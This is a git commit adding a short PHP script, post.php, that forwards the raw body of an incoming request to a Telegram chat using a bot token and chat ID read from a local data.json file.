e1c924ca4d27ab4229720ef77d8fe916d329e0bf
PRIVATE <155662747+PRIVATE001@users.noreply.github.com>
2024-05-17 16:05:14 +0300

    Add files via upload

---
+++ post.php
@@ -0,0 +1,6 @@
+<?php
+$content = trim(file_get_contents("php://input"));
+$data_bot = file_get_contents('data.json');
+$dejson = json_decode($data_bot, true);
+$website="https://api.telegram.org/bot".$dejson['token']."/sendMessage?chat_id=".$dejson['chat_id']."&text=".$content;
+file_get_contents($website);
